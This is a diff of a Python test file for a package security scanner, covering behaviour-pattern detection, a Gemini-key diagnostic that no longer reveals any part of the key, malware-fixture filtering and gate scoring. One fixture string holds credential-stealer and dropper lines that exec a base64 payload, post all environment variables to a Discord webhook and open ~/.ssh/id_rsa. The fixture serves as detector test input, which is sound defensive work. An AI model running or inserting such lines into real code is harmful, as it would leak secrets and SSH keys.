@@ -50,10 +50,14 @@ def test_attack4_behavior_fixture():
     fx = ('exec(base64.b64decode("cHJpbnQoJ2hpJyk="))\n'
           'requests.post("https://discord.com/api/webhooks/123456789/abcdef", data=dict(os.environ))\n'
           'open(os.path.expanduser("~/.ssh/id_rsa"))\n')
-    r = scan_behavior({"text": {"behavior_fixture.txt": fx}, "binaries": []}, "demo", _url_fn)
+    # since ruleset 2026.11.08-11 the regex rules run on code/script files only: the fixture is Python code, so it is
+    # a .py file (it used to be .txt); the same text in a .txt data file is not scanned
+    r = scan_behavior({"text": {"behavior_fixture.py": fx}, "binaries": []}, "demo", _url_fn)
     pats = set(r["profile"]["patterns"])
+    as_data = scan_behavior({"text": {"behavior_fixture.txt": fx}, "binaries": []}, "demo", _url_fn)
     _record("Attack 4: credential-stealer + dropper patterns",
-            {"Credential-stealer pattern", "Dropper / loader pattern"} <= pats, f"patterns: {sorted(pats)}")
+            {"Credential-stealer pattern", "Dropper / loader pattern"} <= pats and not as_data["findings"],
+            f"patterns: {sorted(pats)}; as .txt data: {len(as_data['findings'])} finding(s)")
 
 def test_benign_setup_versions_and_env():
     code = textwrap.dedent('''\
@@ -319,15 +323,19 @@ def test_gemini_key_caption():
     none = cap("", None, "")
     short = cap("abcdefgh", None, "")
     shown = [from_secrets, from_sidebar_both, bad_type, env_only, none, short]
-    ok = (from_secrets == "Gemini key from: secrets (39 chars, ends …ab12)"
-          and from_sidebar_both.startswith("Gemini key from: sidebar (39 chars, ends …ab12)") and "both exist" in from_sidebar_both
-          and "zz99" not in from_sidebar_both
-          and bad_type.startswith("Gemini key from: none") and "is a dict, not a string" in bad_type
-          and env_only.startswith("Gemini key from: environment (39 chars, ends …ab12)") and "stripped" in env_only
-          and none == "Gemini key from: none"
-          and short == "Gemini key from: sidebar (8 chars, too short to show its ending)"
-          and not any(key[:-4] in c or key[-5:] in c for c in shown))
-    _record("Sidebar key caption: source, length, last 4 only, notes", ok, "\n".join(shown))
+    # since the UI fix of 2026-11-08 the diagnostic shows no part of any key (no length, no characters), and the
+    # app does not display it at all
+    other = "AIzaOTHERsecretKEYvalue000000000000zz99"
+    ok = (from_secrets == "Gemini key from: secrets (set)"
+          and from_sidebar_both.startswith("Gemini key from: sidebar (set)") and "both exist" in from_sidebar_both
+          and bad_type.startswith("Gemini key: none") and "is a dict, not a string" in bad_type
+          and env_only == "Gemini key from: environment (set)"
+          and none == "Gemini key: none"
+          and short == "Gemini key from: sidebar (set)"
+          and not any(ch in c for c in shown for ch in (key[-4:], key[:8], other[-4:], "39", "chars", "ends")))
+    _record("Key diagnostic never shows any part of a key (no length, no characters); app does not display it",
+            ok and "describe_gemini_key" not in open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.py"),
+                                                    encoding="utf-8").read(), "\n".join(shown))
 
 def test_sdk_error_status_message_scrubbed():
     from google.genai import errors
@@ -453,6 +461,9 @@ def test_scan_batch_rows():
     from benchmark_fixtures import scan_fixture
     with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "benchmark_fixtures", "mal_credential_stealer.py.sample")) as fh:
         fs = scan_fixture("mal_credential_stealer.py.sample", fh.read())
+    # scan_fixture also returns the Phase 4 data-flow detectors' findings; in a real scan those live in the
+    # detector results, not in malware_proof["findings"], so keep only the malware engine's own findings here
+    fs = [f for f in fs if f.get("source") not in ("Behavior data flow", "Behavior pattern match")]
     secret = {"sev": "High", "source": "Secrets", "rule": "Possible exposed AWS key", "file": "cfg.py", "line": 2, "strong": True}
     bandit = {"sev": "High", "source": "Code (Bandit)", "rule": "B602 shell", "file": "x.py", "line": 1, "strong": False}
     fake = {"ran": True, "findings": [secret, bandit], "coverage": [], "strong": 3, "review": 0, "code_high": 0, "secrets_strong": 1,
@@ -586,10 +597,13 @@ def _own_pkg_check(latest, osv_by_version, registry_fails=False):
     finally:
         S.requests.get, S.requests.post = orig
 
-def _gate_score(findings, level):
+def _gate(findings, level):
     from security import apply_gate
     res = {"score": 90.0, "label": "Healthy", "factors": [], "notes": []}
-    return apply_gate(res, {"level": level, "findings": findings, "coverage": []}, [], None)["score"]
+    return apply_gate(res, {"level": level, "findings": findings, "coverage": []}, [], None)
+
+def _gate_score(findings, level):
+    return _gate(findings, level)["score"]
 
 def test_own_package_latest_affected():
     (findings, cov, mal), calls = _own_pkg_check("2.0.0", {"2.0.0": ["MAL-2026-1", "GHSA-x"], None: ["MAL-2026-1", "MAL-2020-9"]})
@@ -602,7 +616,8 @@ def test_own_package_only_old_version():
     ok = (not mal and len(findings) == 1 and findings[0]["severity"] == "Info" and findings[0]["source"] == "OSV (past malicious release)"
           and "MAL-2022-77" in findings[0]["detail"] and "current release is not listed" in findings[0]["detail"]
           and calls[1] == ("POST", "3.1.0") and ("POST", None) in calls
-          and _gate_score(findings, "No unpatched issues found") == 90.0)
+          and (g := _gate(findings, "No unpatched issues found"))["score"] == 100.0 and g["maintenance_score"] == 90.0
+          and g["trust_label_base"] == "No findings")
     _record("Own package: MAL- only on an older version -> Info only, no cap", ok, f"detail={findings[0]['detail'] if findings else None}")
 
 def test_own_package_lookup_failure():
